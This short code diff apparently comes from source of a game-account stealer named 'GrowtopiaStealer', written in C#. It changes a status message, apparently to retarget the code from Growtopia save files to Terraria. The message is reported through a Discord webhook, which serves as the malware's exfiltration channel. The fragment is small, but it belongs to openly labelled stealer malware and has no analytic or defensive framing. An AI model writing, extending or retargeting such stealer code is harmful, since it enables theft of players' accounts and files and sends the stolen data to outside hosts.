@@ -426,7 +426,7 @@ namespace GrowtopiaStealer // https://github.com/TheC0mpany/GrowtopiaStealer
             }
             catch
             {
-                DiscordWebhook.Send("Growtopia save.dat doesn't exists.");
+                DiscordWebhook.Send("Terraria doesn't exists.");
             }
             try
             {
